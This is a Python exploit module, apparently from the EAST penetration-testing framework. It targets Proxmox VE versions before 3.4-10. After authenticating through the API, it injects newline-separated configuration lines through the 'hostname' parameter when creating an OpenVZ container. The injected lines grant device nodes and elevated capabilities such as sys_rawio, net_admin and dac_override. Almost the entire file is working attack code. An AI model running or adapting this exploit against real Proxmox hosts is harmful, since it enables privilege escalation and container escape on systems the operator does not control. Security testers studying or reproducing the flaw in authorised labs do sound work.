#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import ssl
import json
import time
import socket
import urllib
import urllib2

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_proxmox_configuration_overwrite"
INFO['DESCRIPTION'] = "Proxmox VE < 3.4-10 Configuration file overwriting"
INFO['VENDOR'] = "https://www.proxmox.com/"
INFO['DOWNLOAD_LINK'] = 'https://www.proxmox.com/en/downloads/category/iso-images-pve'
INFO['LINKS'] = 'https://www.exploit-db.com/exploits/39499/'
INFO["CVE Name"] = ""
INFO["NOTES"] = """
Because the Proxmox VE application doesn't check the user-provided "hostname" POST parameter, it's possible to overwrite configuration files using a CRLF injection.

Tested on Proxmox VE v.3.4-6.
"""

INFO['CHANGELOG'] = "29 Feb, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"
OPTIONS["PORT"] = 8006
OPTIONS["SSL"] = True
OPTIONS["USERNAME"] = 'root'
OPTIONS["PASSWORD"] = 'password'
OPTIONS['AUTH_METHOD'] = dict(options=["pam", "pve"], selected="pam")
OPTIONS['HOSTNAME'] = 'lan'
OPTIONS['TEMPLATE'] = 'local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz'
OPTIONS['VMID'] = '12356'



class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.ssl = True
        self.username = OPTIONS["USERNAME"]
        self.password = OPTIONS["PASSWORD"]
        self.auth_method = 'pam'
        self.hostname = 'lan'
        self.vmid = '654321'
        self.template = OPTIONS['TEMPLATE']
        self.state = "running"
        return
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.ssl = bool(self.args.get('SSL', self.ssl))
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        self.auth_method = self.args.get('AUTH_METHOD', self.auth_method)
        self.hostname = self.args.get('HOSTNAME', self.hostname)
        self.template = self.args.get('TEMPLATE', self.template)
        self.vmid = self.args.get('VMID', self.vmid)
        
        return
        
    def make_url(self, path = ''):
        return '{}{}:{}{}'.format(self.prot(), self.host, self.port, path)
        
    def prot(self):
        return self.ssl and 'https://' or 'http://'
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        data = 'username={}&password={}&realm={}'.format(self.username, self.password, self.auth_method)
        request = urllib2.Request(self.make_url('/api2/extjs/access/ticket'), data)
        
        try:
            fd = urllib2.urlopen(request, context = ssl.SSLContext(ssl.PROTOCOL_TLSv1))
        except:
            self.log('Failed')
            self.finish(False)
            
        self.log('[+] Code: ' + str(fd.code))
        text = fd.read()
        
        ticket = json.loads(text)['data']['ticket']
        csrf = json.loads(text)['data']['CSRFPreventionToken']
        
        self.log('[+] Authentication success!')
        
        payload = 'sysdream"\nDEVNODES="dm-0:r"\nCAPABILITIES="mknod:on, sys_chroot:on, sys_rawio: on, net_admin:on,dac_override:on"\n#'

        data = 'vmid={}&hostname={}&storage=local&password=sysdream&ostemplate={}&memory=512&swap=512&disk=2&cpus=1&netif=ifname%3Deth0,bridge%3Dvmbr0'.format(self.vmid, payload, urllib.quote(self.template))
        request = urllib2.Request(self.make_url('/api2/extjs/nodes/{}/openvz'.format(self.hostname)), data)
        request.add_header('CSRFPreventionToken', csrf)
        request.add_header('Cookie', 'PVEAuthCookie=' + ticket)
        
        try:
            fd = urllib2.urlopen(request, context = ssl.SSLContext(ssl.PROTOCOL_TLSv1))
        except:
            self.log('Failed')
            self.finish(False)
            
        self.log('[+] Code: ' + str(fd.code))
        self.log('[+] Result: ' + fd.read())
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
